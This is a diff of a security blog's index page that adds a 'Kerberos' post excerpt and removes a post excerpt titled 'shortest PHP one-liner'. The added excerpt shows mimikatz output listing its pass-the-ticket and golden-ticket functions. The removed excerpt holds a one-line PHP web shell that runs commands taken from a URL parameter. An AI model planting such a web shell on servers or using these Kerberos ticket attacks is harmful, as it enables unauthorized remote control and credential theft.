@@ -405,6 +405,189 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Kerberos.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+      <meta itemprop="name" content="Evi1cg">
+      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
+      <meta itemprop="name" content="Evi1cg's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/archives/Kerberos.html" class="post-title-link" itemprop="url">Kerberos</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2016-01-28 10:14:00" itemprop="dateCreated datePublished" datetime="2016-01-28T10:14:00+08:00">2016-01-28</time>
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/技术分享/" itemprop="url" rel="index"><span itemprop="name">技术分享</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/archives/Kerberos.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/Kerberos.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Kerberos-Modules"><a href="#Kerberos-Modules" class="headerlink" title="Kerberos Modules"></a>Kerberos Modules</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> .#####.   mimikatz <span class="number">2.0</span> alpha (x64) release <span class="string">"Kiwi en C"</span> (Oct  <span class="number">9</span> <span class="number">2015</span> <span class="number">00</span>:<span class="number">33</span>:<span class="number">13</span>)</span><br><span class="line"> .## ^ ##.</span><br><span class="line"> ## / \ ##  <span class="comment">/* * *</span></span><br><span class="line"><span class="comment"> ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"><span class="comment"> '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span></span><br><span class="line"><span class="comment">  '#####'                                     with 16 modules * * */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz # kerberos::</span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">"(null)"</span> command <span class="keyword">of</span> <span class="string">"kerberos"</span> <span class="keyword">module</span> not found !</span><br><span class="line"></span><br><span class="line">Module :        kerberos</span><br><span class="line">Full name :     Kerberos package <span class="keyword">module</span></span><br><span class="line">Description :</span><br><span class="line"></span><br><span class="line">             ptt  -  Pass-the-ticket [NT <span class="number">6</span>]</span><br><span class="line">            list  -  List ticket(s)</span><br><span class="line">             tgt  -  Retrieve current TGT</span><br><span class="line">           purge  -  Purge ticket(s)</span><br><span class="line">          golden  -  Willy Wonka factory</span><br><span class="line">            hash  -  Hash password to keys</span><br><span class="line">             ptc  -  Pass-the-ccache [NT6]</span><br><span class="line">           clist  -  List tickets <span class="keyword">in</span> MIT/Heimdall ccache</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/archives/Kerberos.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    <div>
+    
+    </div>
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+
+  
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/Powershell_MOF_Backdoor.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
@@ -1136,195 +1319,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="https://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://evi1cg.github.io/archives/phpcodes.html">
-
-    <span hidden itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-      <meta itemprop="name" content="Evi1cg">
-      <meta itemprop="description" content="此博客主要用来记录自己技术生涯中所学的一些知识,用来分享和备忘。">
-      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/6007471?s=400&u=58a86031e507e1b49058c9cb52d22dc763e81f9c&v=4#/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization">
-      <meta itemprop="name" content="Evi1cg's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/archives/phpcodes.html" class="post-title-link" itemprop="url">最短php一句话</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2015-12-31 06:43:00" itemprop="dateCreated datePublished" datetime="2015-12-31T06:43:00+08:00">2015-12-31</time>
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="https://schema.org/Thing"><a href="/categories/奇技淫巧/" itemprop="url" rel="index"><span itemprop="name">奇技淫巧</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">评论数：</span>
-                <a href="/archives/phpcodes.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/archives/phpcodes.html" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>
-              &lt;?=`$_GET[1]`;
-详细：http://drops.wooyun.org/papers/11718
-
-              
-            </p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/archives/phpcodes.html#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    <div>
-    
-    </div>
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-
-  
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1375,7 +1369,7 @@
                 
                   <a href="/archive">
                 
-                    <span class="site-state-item-count">99</span>
+                    <span class="site-state-item-count">100</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
